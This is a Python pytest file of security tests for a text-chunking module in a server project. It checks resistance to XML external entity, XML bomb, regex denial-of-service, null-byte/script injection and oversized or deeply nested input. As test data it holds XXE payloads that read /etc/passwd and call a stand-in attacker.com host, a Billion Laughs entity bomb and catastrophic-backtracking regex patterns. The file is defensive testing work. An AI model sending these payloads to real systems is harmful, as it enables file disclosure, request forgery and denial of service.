# test_security.py
"""
Security-focused tests for the Chunking module.
Tests protection against various attack vectors including XXE, ReDoS, and malicious inputs.
"""

import pytest
import json
import time
import re
from unittest.mock import patch, MagicMock

from tldw_Server_API.app.core.Chunking import (
    Chunker,
    InvalidInputError,
    ChunkingError,
)
from tldw_Server_API.app.core.Chunking.strategies.json_xml import XMLChunkingStrategy


class TestXXEProtection:
    """Test protection against XML External Entity (XXE) attacks."""
    
    def test_xxe_file_disclosure_prevented(self):
        """Test that XXE file disclosure attacks are prevented."""
        strategy = XMLChunkingStrategy()
        
        # Classic XXE attack trying to read /etc/passwd
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>
            <data>&xxe;</data>
        </root>"""
        
        # Should either reject the XML or parse without expanding the entity
        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)
    
    def test_xxe_ssrf_prevented(self):
        """Test that XXE SSRF (Server-Side Request Forgery) attacks are prevented."""
        strategy = XMLChunkingStrategy()
        
        # XXE attempting to make HTTP request
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "http://attacker.com/steal-data">
        ]>
        <root>
            <data>&xxe;</data>
        </root>"""
        
        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)
    
    def test_billion_laughs_dos_prevented(self):
        """Test that Billion Laughs (XML bomb) DoS attacks are prevented."""
        strategy = XMLChunkingStrategy()
        
        # Billion Laughs attack - exponential entity expansion
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        ]>
        <lolz>&lol4;</lolz>"""
        
        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)
    
    def test_external_dtd_prevented(self):
        """Test that external DTD loading is prevented."""
        strategy = XMLChunkingStrategy()
        
        # Attempt to load external DTD
        malicious_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
        <root>
            <data>test</data>
        </root>"""
        
        with pytest.raises(InvalidInputError):
            strategy.chunk(malicious_xml, max_size=100)
    
    def test_safe_xml_parsing_works(self):
        """Test that legitimate XML still parses correctly."""
        strategy = XMLChunkingStrategy()
        
        # Safe, legitimate XML
        safe_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <root>
            <chapter>Chapter 1</chapter>
            <chapter>Chapter 2</chapter>
            <chapter>Chapter 3</chapter>
        </root>"""
        
        # Should parse successfully
        chunks = strategy.chunk(safe_xml, max_size=100)
        assert len(chunks) > 0
        assert all(isinstance(chunk, str) for chunk in chunks)


class TestReDoSProtection:
    """Test protection against Regular Expression Denial of Service (ReDoS) attacks."""
    
    def test_complex_regex_timeout(self):
        """Test that complex regex patterns have reasonable timeouts."""
        chunker = Chunker()
        
        # Potentially dangerous regex pattern (catastrophic backtracking)
        evil_pattern = r"(a+)+" + "b"
        
        # Input designed to cause exponential backtracking
        malicious_input = "a" * 30
        
        # Create a large text with the pattern
        text = f"Chapter matching {malicious_input} and more text"
        
        start_time = time.time()
        
        # This should either timeout or handle gracefully, not hang
        with pytest.raises((InvalidInputError, ChunkingError, re.error)) as exc_info:
            chunker.chunk_text(
                text, 
                method='ebook_chapters',
                custom_chapter_pattern=evil_pattern,
                max_size=100
            )
        
        elapsed_time = time.time() - start_time
        
        # Should fail or timeout within reasonable time (not hang for minutes)
        assert elapsed_time < 5.0, "Regex processing took too long, possible ReDoS vulnerability"
    
    def test_regex_complexity_limit(self):
        """Test that overly complex regex patterns are rejected."""
        chunker = Chunker()
        
        # Nested quantifiers that could cause issues
        complex_patterns = [
            r"((a*)*)*b",  # Nested quantifiers
            r"(a+)+$",     # Possessive quantifiers
            r"(.*){10,}",  # Large repetition range
        ]
        
        text = "Sample text for testing regex patterns"
        
        for pattern in complex_patterns:
            # Should either reject the pattern or handle it safely
            try:
                result = chunker.chunk_text(
                    text,
                    method='ebook_chapters', 
                    custom_chapter_pattern=pattern,
                    max_size=100
                )
                # If it doesn't raise an error, it should at least complete quickly
                assert isinstance(result, list)
            except (InvalidInputError, ChunkingError):
                # Expected - pattern was rejected
                pass


class TestInputSanitization:
    """Test input sanitization and validation."""
    
    def test_null_byte_injection_prevented(self):
        """Test that null byte injection is handled safely."""
        chunker = Chunker()
        
        # Text with null bytes that could cause issues
        malicious_text = "Normal text\x00<script>alert('xss')</script>"
        
        # Should handle null bytes safely
        result = chunker.chunk_text(malicious_text, method='words', max_size=10)
        
        # Null bytes should be handled (removed or escaped)
        for chunk in result:
            assert '\x00' not in chunk or chunk.count('\x00') == malicious_text.count('\x00')
    
    def test_unicode_normalization(self):
        """Test that unicode is properly normalized to prevent bypasses."""
        chunker = Chunker()
        
        # Different unicode representations of the same character
        text_variations = [
            "test\u00e9",  # é as single character
            "test\u0065\u0301",  # e + combining acute accent
        ]
        
        results = []
        for text in text_variations:
            result = chunker.chunk_text(text, method='words', max_size=10)
            results.append(result)
        
        # Both should produce consistent results
        assert len(results[0]) == len(results[1])
    
    def test_oversized_input_rejected(self):
        """Test that oversized inputs are rejected to prevent DoS."""
        chunker = Chunker()
        
        # Try to create text larger than allowed limit
        huge_text = "a" * (100_000_001)  # Over 100MB limit
        
        with pytest.raises(InvalidInputError, match="exceeds maximum allowed size"):
            chunker.chunk_text(huge_text)
    
    def test_deeply_nested_json_limited(self):
        """Test that deeply nested JSON has depth limits."""
        from tldw_Server_API.app.core.Chunking.strategies.json_xml import JSONChunkingStrategy
        strategy = JSONChunkingStrategy()
        
        # Create deeply nested JSON
        def create_nested_json(depth):
            if depth == 0:
                return {"value": "leaf"}
            return {"nested": create_nested_json(depth - 1)}
        
        # Very deep nesting could cause stack overflow
        deep_json = json.dumps(create_nested_json(10000))
        
        # Should either handle gracefully or reject
        with pytest.raises((InvalidInputError, RecursionError, json.JSONDecodeError)):
            strategy.chunk(deep_json, max_size=10)


class TestResourceLimits:
    """Test that resource limits are properly enforced."""
    
    def test_memory_limit_enforcement(self):
        """Test that memory usage is limited."""
        chunker = Chunker()
        
        # Large but within limits
        large_text = "word " * 1_000_000  # ~5MB
        
        # Should process without issue
        result = chunker.chunk_text(large_text, method='words', max_size=1000)
        assert len(result) > 0
    
    def test_concurrent_request_limits(self):
        """Test that concurrent requests are limited."""
        from tldw_Server_API.app.core.Chunking.async_chunker import AsyncChunker
        import asyncio
        
        async def test_concurrent():
            chunker = AsyncChunker()
            
            # Try to overwhelm with concurrent requests
            tasks = []
            for i in range(100):
                text = f"Test text {i} " * 100
                task = chunker.chunk_text(text, method='words', max_size=10)
                tasks.append(task)
            
            # Should handle all requests but with rate limiting
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Some should succeed
            successful = [r for r in results if not isinstance(r, Exception)]
            assert len(successful) > 0
            
            await chunker.close()
        
        # Run the async test
        asyncio.run(test_concurrent())


class TestSecurityHeaders:
    """Test security-related configurations and headers."""
    
    def test_default_safe_configuration(self):
        """Test that default configuration is secure."""
        chunker = Chunker()
        
        # Check that security features are enabled by default
        assert chunker.config.max_text_size <= 100_000_000  # Reasonable limit
        assert chunker.config.enable_cache is not None  # Cache config exists
        
    def test_configuration_validation(self):
        """Test that invalid configurations are rejected."""
        from tldw_Server_API.app.core.Chunking.base import ChunkerConfig
        
        # Try to create config with invalid values
        with pytest.raises((ValueError, TypeError)):
            ChunkerConfig(max_text_size=-1)  # Negative size
        
        with pytest.raises((ValueError, TypeError)):
            ChunkerConfig(default_max_size=0)  # Zero chunk size


if __name__ == "__main__":
    pytest.main([__file__, "-v"])